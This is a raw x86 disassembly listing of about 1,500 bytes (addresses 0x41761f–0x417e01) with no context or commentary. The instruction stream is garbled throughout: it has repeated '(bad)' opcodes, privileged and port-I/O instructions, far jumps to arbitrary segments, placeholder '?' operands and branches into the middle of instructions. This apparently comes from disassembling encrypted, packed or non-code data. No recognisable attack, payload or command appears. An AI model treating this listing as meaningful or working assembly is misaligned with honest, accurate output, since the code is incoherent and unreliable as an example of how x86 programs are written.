  41761f:	mov    eax,ds:0x1cc5d749
  417624:	push   esp
  417625:	dec    ebp
  417626:	inc    eax
  417627:	push   ebp
  417628:	test   ebp,0x6c205867
  41762e:	push   esi
  41762f:	add    ebx,edx
  417631:	stc    
  417632:	sub    BYTE PTR [ecx-0x61caf616],al
  417638:	or     DWORD PTR [ebx],ecx
  41763a:	jmp    0x27ea9789
  41763f:	xor    DWORD PTR [edi+0x3cb008d3],ebp
  417645:	gs jmp 0x417658
  417648:	xor    bl,BYTE PTR gs:[esp]
  41764c:	xor    eax,0xb2dc1740
  417651:	mov    ebp,0x518ca639
  417656:	rcr    edi,cl
  417658:	lods   eax,DWORD PTR ds:[esi]
  417659:	jge    0x417655
  41765b:	mov    cl,ch
  41765d:	xor    eax,0x6f7f266d
  417662:	dec    esp
  417663:	fmul   DWORD PTR [edx-0x7caf1bd4]
  417669:	inc    edx
  41766a:	jle    0x417672
  41766c:	in     eax,0xff
  41766e:	cmc    
  41766f:	jg     0x41763f
  417671:	test   eax,0xec6001da
  417676:	stos   DWORD PTR es:[edi],eax
  417677:	pushf  
  417678:	xor    DWORD PTR [esi],0xd8e884b9
  41767e:	push   esi
  41767f:	lahf   
  417680:	push   edx
  417681:	and    al,0x9b
  417683:	inc    esi
  417684:	and    DWORD PTR [esi],0x27
  417687:	xchg   esi,eax
  417688:	fcmovu st,st(7)
  41768a:	test   al,0x67
  41768c:	fdiv   DWORD PTR [ebp+0x62]
  41768f:	or     eax,DWORD PTR [eax-0x5]
  417692:	inc    esp
  417693:	ret    0x7747
  417696:	imul   edi,DWORD PTR [edx+ebp*2],0x7a
  41769a:	ss push edi
  41769c:	mov    al,ds:0xd2e6ce62
  4176a1:	fstp   DWORD PTR [edx+edx*4]
  4176a4:	push   cs
  4176a5:	pop    ebx
  4176a6:	cs xchg ecx,eax
  4176a8:	mov    DWORD PTR [esi],0xae9883f5
  4176ae:	iret   
  4176af:	gs scas al,BYTE PTR es:[edi]
  4176b1:	test   al,cl
  4176b3:	adc    ecx,edi
  4176b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176b6:	outs   dx,DWORD PTR ds:[esi]
  4176b7:	sbb    esp,0xf240d69e
  4176bd:	mov    ebp,0x40833359
  4176c2:	mov    bl,0xd8
  4176c4:	mov    edi,0xed540ef1
  4176c9:	in     eax,dx
  4176ca:	push   esp
  4176cb:	or     al,BYTE PTR [edi+0x71]
  4176ce:	inc    esp
  4176cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176d0:	lock mov WORD PTR [edx-0x7d],es
  4176d4:	dec    eax
  4176d5:	push   ebx
  4176d6:	(bad)  
  4176d7:	and    BYTE PTR [edx-0x5459ee63],ah
  4176dd:	push   edi
  4176de:	out    0xce,eax
  4176e0:	cmp    eax,0x90a9061d
  4176e5:	pushf  
  4176e6:	inc    esp
  4176e7:	add    ecx,ebx
  4176e9:	scas   al,BYTE PTR es:[edi]
  4176ea:	jb     0x417696
  4176ec:	push   DWORD PTR [ecx]
  4176ee:	sbb    esi,esi
  4176f0:	repnz clc 
  4176f2:	xor    dl,dh
  4176f4:	in     al,0x5d
  4176f6:	imul   ebx,DWORD PTR ds:0xd2512a3f,0x20889e91
  417700:	mov    edi,0x873d9646
  417705:	stc    
  417706:	xchg   edi,eax
  417707:	or     ebx,DWORD PTR [eax-0x7e]
  41770a:	pop    ds
  41770b:	or     BYTE PTR [edi+edi*8-0x398adc53],cl
  417712:	sbb    eax,0x24f51bf7
  417717:	push   eax
  417718:	aas    
  417719:	xchg   BYTE PTR [eax+ecx*8+0x46],dl
  41771d:	or     cl,BYTE PTR [ecx]
  41771f:	mov    ds:0xa804521,eax
  417724:	pop    ebp
  417725:	and    DWORD PTR [esi-0x68],edx
  417728:	push   esi
  417729:	aas    
  41772a:	outs   dx,DWORD PTR ds:[esi]
  41772b:	push   0x3a
  41772d:	pop    ebx
  41772e:	add    esi,DWORD PTR [edx]
  417730:	add    cl,BYTE PTR [edx-0x52d35874]
  417736:	repnz outs dx,DWORD PTR ds:[esi]
  417738:	jo     0x4176c4
  41773a:	not    BYTE PTR [esi-0x34]
  41773d:	imul   esi,DWORD PTR [ebp-0x30],0xffffffc5
  417741:	cmp    DWORD PTR [ebx-0x1554aca2],0xd55327c2
  41774b:	dec    ebx
  41774c:	std    
  41774d:	lock sub BYTE PTR [ecx],ah
  417750:	pop    ecx
  417751:	adc    ebp,0x68
  417754:	cmp    al,0x6e
  417756:	aas    
  417757:	lock add al,ah
  41775a:	xor    al,0x3e
  41775c:	cmp    eax,0x557f5e56
  417761:	inc    ebp
  417762:	leave  
  417763:	jg     0x417712
  417765:	pop    ds
  417766:	xchg   esp,eax
  417767:	int    0x27
  417769:	stc    
  41776a:	imul   edi,ebp,0xffffff9a
  41776d:	mov    bl,0x7c
  41776f:	jle    0x417758
  417771:	int3   
  417772:	aas    
  417773:	sub    DWORD PTR [ebp-0x56],0xffffffee
  417777:	shr    DWORD PTR [esi-0x7e02fd0f],1
  41777d:	adc    DWORD PTR [edx+0x33de685f],edi
  417783:	or     eax,0x92362738
  417788:	in     eax,0x4b
  41778a:	fnstsw WORD PTR [ebx]
  41778c:	scas   eax,DWORD PTR es:[edi]
  41778d:	sub    al,0x72
  41778f:	(bad)  
  417790:	mov    dh,0xb7
  417792:	adc    bh,BYTE PTR [eax-0x4ff748dd]
  417798:	jbe    0x417736
  41779a:	sti    
  41779b:	xchg   DWORD PTR [edi-0x62312972],edi
  4177a1:	jp     0x4177da
  4177a3:	cli    
  4177a4:	or     ecx,DWORD PTR [ebp+0x654d102f]
  4177aa:	push   edx
  4177ab:	jnp    0x41774b
  4177ad:	sub    DWORD PTR [ebx-0x1e],edi
  4177b0:	or     ecx,DWORD PTR [eax-0x16]
  4177b3:	xor    DWORD PTR [ecx+0x3],ebp
  4177b6:	in     al,dx
  4177b7:	js     0x4177b9
  4177b9:	xlat   BYTE PTR ds:[ebx]
  4177ba:	fdivp  st(7),st
  4177bc:	jmp    0x417820
  4177be:	inc    esi
  4177bf:	in     eax,dx
  4177c0:	in     al,dx
  4177c1:	hlt    
  4177c2:	inc    esp
  4177c3:	pop    ds
  4177c4:	icebp  
  4177c5:	pop    eax
  4177c6:	xor    al,0xd
  4177c8:	sbb    edi,DWORD PTR [ecx+0x5b]
  4177cb:	ror    BYTE PTR [ebp+0x74],cl
  4177ce:	out    0xee,eax
  4177d0:	adc    DWORD PTR [ebx],ebp
  4177d2:	jp     0x41775d
  4177d4:	gs mov ecx,0x6c4e5dc7
  4177da:	adc    al,0xa6
  4177dc:	ds call 0x32b34a7c
  4177e2:	and    eax,0xcbf061a4
  4177e7:	int    0xc1
  4177e9:	(bad)  
  4177ea:	div    DWORD PTR [ebx+0xdbf62ec]
  4177f0:	dec    eax
  4177f1:	inc    ecx
  4177f2:	(bad)  
  4177f3:	lods   eax,DWORD PTR ds:[esi]
  4177f4:	push   ecx
  4177f5:	jae    0x4177f0
  4177f7:	stos   DWORD PTR es:[edi],eax
  4177f8:	mov    ds:0xec9f99d,al
  4177fd:	dec    ecx
  4177fe:	adc    al,0x9c
  417800:	jo     0x417868
  417802:	pop    ebx
  417803:	in     al,0x77
  417805:	inc    ebp
  417806:	lea    ecx,[esi+edx*4-0x28]
  41780a:	sahf   
  41780b:	xor    bh,BYTE PTR [ebx-0x6b]
  41780e:	mov    cl,0xc3
  417810:	lea    ebp,[ecx-0x5fe31f14]
  417816:	mov    ecx,0x7a0eede5
  41781b:	retf   
  41781c:	test   DWORD PTR [eax],0x9c143153
  417822:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  417824:	mov    ch,0xe7
  417826:	(bad)  
  417827:	loop   0x41785e
  417829:	mov    dl,0x4
  41782b:	fsub   DWORD PTR ds:0x3712b58a
  417831:	sbb    esp,DWORD PTR [edx+0x2fca447b]
  417837:	outs   dx,DWORD PTR ds:[esi]
  417838:	push   ecx
  417839:	ficom  WORD PTR [ebx+esi*2+0x5e]
  41783d:	adc    esi,DWORD PTR [edi]
  41783f:	sub    eax,0x652cdacd
  417844:	cs pop ds
  417846:	lea    ebx,[eax+0x4693115]
  41784c:	mov    ah,0x1c
  41784e:	push   0x46ed1e24
  417853:	retf   0x2fd8
  417856:	xor    al,0x23
  417858:	scas   al,BYTE PTR es:[edi]
  417859:	push   ecx
  41785a:	jnp    0x417847
  41785c:	jno    0x4178af
  41785e:	jmp    0x4178d9
  417860:	jg     0x4178a7
  417862:	sbb    eax,0xc120cc4f
  417867:	idiv   esi
  417869:	adc    edi,edi
  41786b:	cmp    ebp,DWORD PTR [edi]
  41786d:	pop    edi
  41786e:	push   ss
  41786f:	pop    edi
  417870:	sar    DWORD PTR [ecx-0x598fa579],1
  417876:	fnstenv [edi+0x77]
  417879:	stc    
  41787a:	xchg   edx,eax
  41787b:	icebp  
  41787c:	stos   DWORD PTR es:[edi],eax
  41787d:	jns    0x417819
  41787f:	lods   al,BYTE PTR ds:[esi]
  417880:	cmp    bh,BYTE PTR [edx]
  417882:	jnp    0x4178eb
  417884:	sar    BYTE PTR [ebx+edi*1-0x7b5a7417],0xfd
  41788c:	or     ax,0xd2f0
  417890:	fnstsw WORD PTR [eax+0x3fc3ed91]
  417896:	adc    al,0xb4
  417898:	pop    esi
  417899:	and    al,0x70
  41789b:	icebp  
  41789c:	test   al,0x4e
  41789e:	sbb    bh,0x16
  4178a1:	sub    BYTE PTR [ecx-0x2f],dh
  4178a4:	sub    DWORD PTR [esi],0x19
  4178a7:	dec    esp
  4178a8:	xor    DWORD PTR [eax+0x4f],ebx
  4178ab:	imul   esi,esp,0x4fd57034
  4178b1:	std    
  4178b2:	adc    eax,0xb711134b
  4178b7:	dec    ecx
  4178b8:	push   esp
  4178b9:	or     eax,0xb752e592
  4178be:	sbb    al,0xd1
  4178c0:	push   esp
  4178c1:	ins    BYTE PTR es:[edi],dx
  4178c2:	jbe    0x417933
  4178c4:	cdq    
  4178c5:	lea    edx,[edx+ebx*2+0x4ca187e8]
  4178cc:	xchg   ebp,eax
  4178cd:	adc    bh,cl
  4178cf:	pop    ss
  4178d0:	dec    ebp
  4178d1:	jmp    0x4178c1
  4178d3:	(bad)  
  4178d4:	lods   al,BYTE PTR ds:[esi]
  4178d5:	out    0x51,eax
  4178d7:	in     eax,0x4b
  4178d9:	xor    DWORD PTR [ecx],ecx
  4178db:	in     al,0xd6
  4178dd:	jmp    0x7f33efe3
  4178e2:	popf   
  4178e3:	fsubr  DWORD PTR [ebp+0x77]
  4178e6:	add    BYTE PTR [ecx],dh
  4178e8:	dec    ebp
  4178e9:	fsubr  DWORD PTR [eax-0x6e]
  4178ec:	dec    eax
  4178ed:	push   eax
  4178ee:	test   BYTE PTR ds:0xcc80f104,ah
  4178f4:	sbb    DWORD PTR [eax-0x2446a121],ecx
  4178fa:	das    
  4178fb:	mov    fs,WORD PTR [edi]
  4178fd:	sar    esi,0xc5
  417900:	in     al,dx
  417901:	fsubr  st,st(5)
  417903:	jb     0x41791a
  417905:	xor    BYTE PTR [eax],cl
  417907:	or     BYTE PTR [eax],ch
  417909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41790a:	add    bl,ch
  41790c:	inc    edi
  41790d:	or     DWORD PTR [esi-0x42],ebx
  417910:	push   0x4753073f
  417915:	in     al,0x7e
  417917:	sub    ch,0xde
  41791a:	sub    BYTE PTR [ebp+ecx*4+0x69],bh
  41791e:	fst    QWORD PTR [edx]
  417920:	fnstenv [ecx+ecx*1+0x129f7762]
  417927:	in     eax,dx
  417928:	fdiv   DWORD PTR [esp+edx*2]
  41792b:	mov    dh,0xec
  41792d:	mov    WORD PTR [edi+0x5b],fs
  417930:	xor    DWORD PTR [eax-0x1097ce11],edi
  417936:	ror    BYTE PTR [ebx+0xabcb0e6],cl
  41793c:	retf   
  41793d:	adc    BYTE PTR [eax*4+0x65d4fbb8],0x2c
  417945:	mov    eax,0x72e1c7f6
  41794a:	data16 lock adc dh,BYTE PTR [ebx+ebp*1-0x6ee99df0]
  417953:	mov    bl,0xa
  417955:	adc    eax,0xede45e1b
  41795a:	arpl   sp,sp
  41795c:	mov    edx,edi
  41795e:	jg     0x4179b1
  417960:	xchg   edx,eax
  417961:	fiadd  WORD PTR ds:0x66ab7b5b
  417967:	inc    esi
  417968:	xchg   ecx,eax
  417969:	add    BYTE PTR [ebp-0x55],ah
  41796c:	sahf   
  41796d:	mov    edx,0xca24c65c
  417972:	out    dx,al
  417973:	hlt    
  417974:	xor    al,0x53
  417976:	aad    0x84
  417978:	mov    edi,eax
  41797a:	adc    esi,edi
  41797c:	scas   al,BYTE PTR es:[edi]
  41797d:	mov    bh,0x65
  41797f:	pop    esp
  417980:	imul   ecx,DWORD PTR [ecx+0x76968661],0x3885d912
  41798a:	sar    DWORD PTR [ebx],cl
  41798c:	xchg   ebp,eax
  41798d:	fincstp 
  41798f:	xchg   ebx,eax
  417990:	mov    esp,DWORD PTR [ebx-0x7f]
  417993:	shr    ebx,1
  417995:	test   eax,esp
  417997:	sbb    DWORD PTR [eax+0x4d1c9fb9],eax
  41799d:	pushf  
  41799e:	xchg   edi,eax
  41799f:	cmp    ah,BYTE PTR [esi-0x738436f3]
  4179a5:	ret    0xdaab
  4179a8:	ret    
  4179a9:	or     edx,ebx
  4179ab:	mov    ah,0x4d
  4179ad:	dec    ecx
  4179ae:	inc    ecx
  4179af:	je     0x4179d5
  4179b1:	hlt    
  4179b2:	jmp    0x9559:0x1646284c
  4179b9:	retf   
  4179ba:	cdq    
  4179bb:	mov    ds:0xf408c6d6,al
  4179c0:	jno    0x4179e9
  4179c2:	lds    edx,FWORD PTR [ebx-0x73]
  4179c5:	out    dx,al
  4179c6:	cdq    
  4179c7:	jbe    0x4179ed
  4179c9:	cmp    eax,0x581463bb
  4179ce:	enter  0x48e8,0x7b
  4179d2:	or     DWORD PTR [esi+0x47fdf115],esi
  4179d8:	pop    edi
  4179d9:	jmp    0x4179d0
  4179db:	jno    0x4179e0
  4179dd:	hlt    
  4179de:	mov    edi,?
  4179e0:	cld    
  4179e1:	int    0xa1
  4179e3:	sbb    eax,0x5b4630
  4179e8:	mov    ebp,0xbf750286
  4179ed:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4179ef:	mov    edx,0x32ff87ad
  4179f4:	jmp    0x2a9e:0x6e378753
  4179fb:	and    DWORD PTR [ebx-0x6575d1e3],ebx
  417a01:	pop    esp
  417a02:	addr16 mov eax,ds:0x129f
  417a06:	(bad)
  417a0a:	sbb    al,0x39
  417a0c:	in     al,0x52
  417a0e:	and    bh,bh
  417a10:	rcr    dl,1
  417a12:	jmp    0xc7ad2fd1
  417a17:	mov    BYTE PTR [edi+0x7e],bh
  417a1a:	imul   ecx,DWORD PTR [edx],0xfea48ada
  417a20:	mov    ecx,esp
  417a22:	sbb    edi,DWORD PTR [ebp-0x48]
  417a25:	aaa    
  417a26:	and    eax,0x6d97b18e
  417a2b:	jb     0x417aaa
  417a2d:	xchg   edi,eax
  417a2e:	in     al,0xfb
  417a30:	pop    esp
  417a31:	or     DWORD PTR [edx],edx
  417a33:	add    al,0xbc
  417a35:	push   0x50854a55
  417a3a:	repnz inc esi
  417a3c:	outs   dx,BYTE PTR ds:[esi]
  417a3d:	jb     0x417a82
  417a3f:	and    ecx,edx
  417a41:	add    BYTE PTR [ecx+0x66],bl
  417a44:	mov    ebp,0x8e2bb0b3
  417a49:	pop    ds
  417a4a:	test   DWORD PTR [ebx-0x68],edi
  417a4d:	in     al,0xf0
  417a4f:	aas    
  417a50:	repnz sub eax,0xd622fe0c
  417a56:	xchg   ecx,eax
  417a57:	iret   
  417a58:	mov    bl,0x5a
  417a5a:	sub    eax,0xde268585
  417a5f:	enter  0x9ca7,0xca
  417a63:	inc    esp
  417a64:	xchg   ebx,eax
  417a65:	sub    edi,ebp
  417a67:	aaa    
  417a68:	not    ecx
  417a6a:	(bad)  
  417a6b:	(bad)  
  417a6c:	sbb    al,0xd3
  417a6e:	out    dx,al
  417a6f:	push   esp
  417a70:	or     ebx,ebx
  417a72:	jmp    0x417aa4
  417a74:	sub    DWORD PTR [edx],ecx
  417a76:	mov    ebx,0x19c3b882
  417a7b:	push   esi
  417a7c:	sbb    dh,dh
  417a7e:	sbb    DWORD PTR [eax+esi*8],eax
  417a81:	dec    edi
  417a82:	or     eax,0xa9bce8c
  417a87:	or     BYTE PTR [edi+0x21b4d8dd],0xb9
  417a8e:	ins    DWORD PTR es:[edi],dx
  417a8f:	mov    edi,0xfd21f7dc
  417a94:	ds cwde 
  417a96:	dec    esp
  417a97:	aas    
  417a98:	mov    fs,WORD PTR [edx-0x36a1ad2f]
  417a9e:	in     eax,0x75
  417aa0:	inc    ebx
  417aa1:	ds pusha 
  417aa3:	ja     0x417b0b
  417aa5:	pusha  
  417aa6:	daa    
  417aa7:	mov    cl,0x9d
  417aa9:	aaa    
  417aaa:	inc    esp
  417aab:	pop    ds
  417aac:	mov    WORD PTR [eax-0x461c46c4],?
  417ab2:	outs   dx,DWORD PTR ds:[esi]
  417ab3:	or     al,BYTE PTR [edi]
  417ab5:	mov    esi,0x70e5e929
  417aba:	jecxz  0x417b0e
  417abc:	ins    BYTE PTR es:[edi],dx
  417abd:	dec    ebp
  417abe:	aaa    
  417abf:	clc    
  417ac0:	sahf   
  417ac1:	or     eax,0xe5aa4555
  417ac6:	pop    eax
  417ac7:	and    edi,DWORD PTR [edi-0x711b792]
  417acd:	iret   
  417ace:	adc    al,0x2d
  417ad0:	mov    ah,0xa
  417ad2:	pop    es
  417ad3:	fistp  WORD PTR [edx+0xf]
  417ad6:	ins    DWORD PTR es:[edi],dx
  417ad7:	add    dl,BYTE PTR [esi]
  417ad9:	imul   esp,DWORD PTR [ecx],0xffffff88
  417adc:	nop
  417add:	jns    0x417b58
  417adf:	push   0x6a
  417ae1:	dec    esp
  417ae2:	sbb    eax,0x1b2fcd82
  417ae7:	mov    al,0xf0
  417ae9:	lods   eax,DWORD PTR ds:[esi]
  417aea:	xlat   BYTE PTR ds:[ebx]
  417aeb:	fisub  DWORD PTR [ecx]
  417aed:	or     esp,DWORD PTR [eax]
  417aef:	mov    esi,0xd3fbdbe
  417af4:	jmp    0xeab194d5
  417af9:	inc    BYTE PTR [edi]
  417afb:	jne    0x417b55
  417afd:	dec    ebp
  417afe:	fst    QWORD PTR [edx-0x1a]
  417b01:	pop    ebx
  417b02:	add    al,0x98
  417b04:	mov    dh,BYTE PTR [eax+0x63]
  417b07:	iret   
  417b08:	test   eax,0xacef472f
  417b0d:	loop   0x417a9f
  417b0f:	add    eax,0xa6142f18
  417b14:	jecxz  0x417b77
  417b16:	call   0x25f:0xb38bceb9
  417b1d:	rcr    BYTE PTR [edi+edx*1+0x5202fccc],cl
  417b24:	jl     0x417b52
  417b26:	and    ebx,ebx
  417b28:	pop    ebx
  417b29:	mov    edx,0xd58ce91c
  417b2e:	push   ebx
  417b2f:	pushf  
  417b30:	mov    esi,0x96add5b2
  417b35:	mov    ebp,0x120681c0
  417b3a:	pop    esi
  417b3b:	out    dx,al
  417b3c:	mov    dl,BYTE PTR [eax+0x1e]
  417b3f:	loop   0x417ac5
  417b41:	js     0x417ac5
  417b43:	test   DWORD PTR fs:[eax],edi
  417b46:	jl     0x417ba3
  417b48:	pop    ecx
  417b49:	and    DWORD PTR ds:0xb0dd1509,esi
  417b4f:	add    al,0x8e
  417b51:	sub    dh,bl
  417b53:	mul    ah
  417b55:	add    edi,DWORD PTR [esi+edi*1-0x50]
  417b59:	out    dx,al
  417b5a:	xor    edi,DWORD PTR [ebp-0x71a8ab66]
  417b60:	adc    DWORD PTR [ebp+0x54],edi
  417b63:	push   ecx
  417b64:	arpl   WORD PTR [esi+eiz*4],ax
  417b67:	xchg   ah,bh
  417b69:	xor    bl,BYTE PTR [esi+0x62020fa9]
  417b6f:	in     eax,dx
  417b70:	mov    bh,0x15
  417b72:	cmp    al,0xa0
  417b74:	sbb    edi,edi
  417b76:	xchg   ebx,eax
  417b77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b78:	adc    al,0x78
  417b7a:	cmp    ebp,DWORD PTR [esi]
  417b7c:	or     DWORD PTR [eax+0x66],0xffffff84
  417b80:	push   eax
  417b81:	or     dl,BYTE PTR [ebx+0x73c3adbb]
  417b87:	clc    
  417b88:	jg     0x417bc5
  417b8a:	fldcw  WORD PTR [edx-0x5ac3cfc7]
  417b90:	gs xchg ebx,eax
  417b92:	enter  0x4fb1,0x13
  417b96:	int    0xaf
  417b98:	dec    edx
  417b99:	xor    al,BYTE PTR [ebx]
  417b9b:	pop    esp
  417b9c:	mov    eax,ds:0x9f2b273
  417ba1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ba2:	imul   ebx,DWORD PTR [ecx],0x7d
  417ba5:	shr    BYTE PTR [edx+0x3901b73c],0x98
  417bac:	or     BYTE PTR [edi],dl
  417bae:	hlt    
  417baf:	pop    edx
  417bb0:	push   ecx
  417bb1:	mov    bl,BYTE PTR [ebx+eiz*1-0xc0431da]
  417bb8:	ins    BYTE PTR es:[edi],dx
  417bb9:	fmul   st,st(2)
  417bbb:	shr    BYTE PTR ds:0x96f23d93,0x9e
  417bc2:	adc    al,0x38
  417bc4:	lds    ebx,FWORD PTR [ebx]
  417bc6:	jnp    0x417b6a
  417bc8:	retf   
  417bc9:	sub    al,0x9c
  417bcb:	(bad)  
  417bcc:	arpl   di,sp
  417bce:	pop    ebp
  417bcf:	jnp    0x417c3b
  417bd1:	mov    ds:0xac6e1c57,eax
  417bd6:	jle    0x417c56
  417bd8:	cs leave 
  417bda:	cmp    eax,0xbcb0d6c4
  417bdf:	pop    ds
  417be0:	pop    ebx
  417be1:	rcr    DWORD PTR ds:0xddbac913,0x2e
  417be8:	and    DWORD PTR [edx+ecx*8-0x72917239],ebx
  417bef:	retf   
  417bf0:	cmp    al,0xa8
  417bf2:	jbe    0x417c34
  417bf4:	xor    edi,DWORD PTR [ebp-0x5a8f8d55]
  417bfa:	add    BYTE PTR [esi+0x24],cl
  417bfd:	inc    edi
  417bfe:	pop    edx
  417bff:	nop
  417c00:	pop    eax
  417c01:	cld    
  417c02:	aaa    
  417c03:	xchg   esi,eax
  417c04:	mov    bh,0xad
  417c06:	and    eax,0x8ee8d2ba
  417c0b:	mov    ecx,0xc6879809
  417c10:	es inc esp
  417c12:	fisub  DWORD PTR [edi+0x36fcc939]
  417c18:	pop    ecx
  417c19:	cwde   
  417c1a:	je     0x417bc3
  417c1c:	iret   
  417c1d:	push   cs
  417c1e:	in     eax,0x75
  417c20:	add    ch,BYTE PTR [edi]
  417c22:	daa    
  417c23:	jl     0x417be7
  417c25:	jae    0x417c09
  417c27:	iret   
  417c28:	aas    
  417c29:	stc    
  417c2a:	dec    ecx
  417c2b:	or     esi,esp
  417c2d:	xchg   edx,eax
  417c2e:	xor    BYTE PTR [esi-0xac8a101],cl
  417c34:	cli    
  417c35:	stc    
  417c36:	inc    ecx
  417c37:	int    0xcf
  417c39:	inc    esp
  417c3a:	mov    bl,0x21
  417c3c:	sbb    eax,0xddbe67c
  417c41:	fucom  st(0)
  417c43:	cmp    al,0xda
  417c45:	xchg   edx,eax
  417c46:	mov    edi,0xc5e541c8
  417c4b:	xchg   esp,eax
  417c4c:	adc    al,0x6a
  417c4e:	mov    dl,0x8e
  417c50:	or     al,0xf0
  417c52:	aas    
  417c53:	sahf   
  417c54:	pop    ss
  417c55:	out    dx,eax
  417c56:	cmp    dh,BYTE PTR [eax-0x37c11914]
  417c5c:	fs stc 
  417c5e:	or     al,0x83
  417c60:	push   ebp
  417c61:	and    dl,BYTE PTR [esi+0x45cc0939]
  417c67:	add    bl,bl
  417c69:	call   0x83c7:0x1473afd7
  417c70:	psubw  mm4,QWORD PTR [edx+0x7f]
  417c74:	inc    esi
  417c75:	fs ds loop 0x417c2e
  417c79:	cdq    
  417c7a:	add    BYTE PTR [eax+0x4b],dh
  417c7d:	mov    edi,0x2595bac9
  417c82:	push   0xffffffda
  417c84:	push   eax
  417c85:	out    0xa2,eax
  417c87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c88:	mov    dh,dl
  417c8a:	jmp    0x807ef2a9
  417c8f:	repz fistp QWORD PTR [esi+0x5b]
  417c93:	dec    eax
  417c94:	mov    esi,DWORD PTR [esi+eax*4-0x47990e21]
  417c9b:	lea    eax,[ecx+0x2c66afd1]
  417ca1:	mov    ?,WORD PTR [ebp+0x47113107]
  417ca7:	pop    es
  417ca8:	pop    edx
  417ca9:	xor    DWORD PTR [edi],0x2
  417cac:	imul   edx,DWORD PTR [ecx+0x38],0x74
  417cb0:	jmp    0x417d05
  417cb2:	test   eax,0x46fd068d
  417cb7:	hlt    
  417cb8:	(bad)  
  417cb9:	and    ebx,DWORD PTR [eax+edi*2]
  417cbc:	mov    cl,0x3f
  417cbe:	fisttp QWORD PTR [ecx+ebp*4+0x51ba7066]
  417cc5:	test   BYTE PTR ds:0xd293cc77,al
  417ccb:	jmp    0x1c1b1b53
  417cd0:	int    0xdd
  417cd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cd3:	push   ebx
  417cd4:	ins    DWORD PTR es:[edi],dx
  417cd5:	aas    
  417cd6:	clc    
  417cd7:	cs jmp 0x9b4c:0x48ebfbb6
  417cdf:	aaa    
  417ce0:	mov    esi,0x32effffb
  417ce5:	jmp    0xdef1:0x3786fc3b
  417cec:	lock mov esi,0xfc54854e
  417cf2:	mov    WORD PTR [ecx+0x4b27e8d5],fs
  417cf8:	cmp    esp,DWORD PTR [edi-0x7f]
  417cfb:	fmul   QWORD PTR [ebp-0x6e988422]
  417d01:	neg    BYTE PTR gs:[esi]
  417d04:	sub    eax,0x56e2a46b
  417d09:	(bad)  
  417d0b:	popa   
  417d0c:	sbb    cl,BYTE PTR [ebx-0x4e]
  417d0f:	jo     0x417ce2
  417d11:	pop    ds
  417d12:	rcl    BYTE PTR ds:0xd6cd084a,cl
  417d18:	mov    esp,0x4a6339bf
  417d1d:	jmp    0x417d72
  417d1f:	call   0xec141a99
  417d24:	iret   
  417d25:	imul   eax,DWORD PTR [eax-0x7d],0xffffffee
  417d29:	inc    ebx
  417d2a:	add    eax,0x8eed004e
  417d2f:	mov    edi,0xeadc8090
  417d34:	test   BYTE PTR [edi-0x53],0xf0
  417d38:	pop    es
  417d39:	sbb    esi,DWORD PTR [eax]
  417d3b:	mov    bh,0xb3
  417d3d:	stos   BYTE PTR es:[edi],al
  417d3e:	mov    cl,0x7e
  417d40:	mov    ebp,0x2849d2d9
  417d45:	add    eax,0x22e8e859
  417d4a:	jo     0x417d37
  417d4c:	(bad)  
  417d4d:	sub    dh,BYTE PTR [edi]
  417d4f:	sbb    edi,edi
  417d51:	(bad)  
  417d52:	ror    dl,1
  417d54:	jmp    FWORD PTR [edx-0x76db6c1]
  417d5a:	add    ebx,edi
  417d5c:	jl     0x417d90
  417d5e:	xor    al,0xb1
  417d60:	mov    dl,BYTE PTR [edx+eax*2+0x28]
  417d64:	push   fs
  417d66:	xchg   ebp,eax
  417d67:	cmp    ah,BYTE PTR [edx+0x7e]
  417d6a:	jnp    0x417d21
  417d6c:	loopne 0x417dc8
  417d6e:	mov    cl,0x9
  417d70:	das    
  417d71:	pop    edx
  417d72:	out    dx,eax
  417d73:	or     eax,DWORD PTR [ecx-0x2b]
  417d76:	in     eax,0x21
  417d78:	je     0x417d4a
  417d7a:	repz pop ebp
  417d7c:	push   ebp
  417d7d:	(bad)  
  417d7e:	ret    0xeef4
  417d81:	in     eax,0x4b
  417d83:	adc    al,0xd0
  417d85:	inc    ecx
  417d86:	push   cs
  417d87:	jmp    DWORD PTR [edi+0x2be45085]
  417d8d:	mov    dh,BYTE PTR [eax+0x7b]
  417d90:	add    ch,ch
  417d92:	ret    0xd055
  417d95:	call   FWORD PTR [eax]
  417d97:	in     eax,dx
  417d98:	popf   
  417d99:	scas   eax,DWORD PTR es:[edi]
  417d9a:	jae    0x417d6e
  417d9c:	sbb    dl,BYTE PTR [esi-0x60]
  417d9f:	mov    al,ds:0x81f38a05
  417da4:	adc    DWORD PTR ss:[eax-0x68],0x5db4c92b
  417dac:	push   edi
  417dad:	fcomip st,st(4)
  417daf:	dec    ecx
  417db0:	jl     0x417d4f
  417db2:	not    ecx
  417db4:	icebp  
  417db5:	out    0xab,al
  417db7:	(bad)  
  417db8:	cs loopne 0x417dd6
  417dbb:	jne    0x417dc1
  417dbd:	jnp    0x417d82
  417dbf:	pop    eax
  417dc0:	rcr    ebp,0x6f
  417dc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dc4:	push   ebx
  417dc5:	pusha  
  417dc6:	push   cs
  417dc7:	shl    BYTE PTR [bx+si],0x1b
  417dcb:	mov    bh,0x76
  417dcd:	push   ebp
  417dce:	mov    al,ds:0x89840b72
  417dd3:	es cdq 
  417dd5:	sbb    al,0x69
  417dd7:	mov    DWORD PTR [ecx],esp
  417dd9:	push   ebx
  417dda:	leave  
  417ddb:	addr16 jne 0x417dfa
  417dde:	mov    bl,BYTE PTR [edi]
  417de0:	bound  ebx,QWORD PTR [edx+0x3b8d6cac]
  417de6:	stc    
  417de7:	push   cs
  417de8:	pop    ebp
  417de9:	adc    esp,DWORD PTR [edi-0x13706671]
  417def:	sub    DWORD PTR [edx-0x333c767c],ecx
  417df5:	mov    ch,0x78
  417df7:	imul   ecx,DWORD PTR [eax],0xffffffae
  417dfa:	xchg   ebx,eax
  417dfb:	mov    dl,0xfa
  417dfd:	pop    esp
  417dfe:	cmp    esi,DWORD PTR [ecx-0x72]
  417e01:	(bad)  
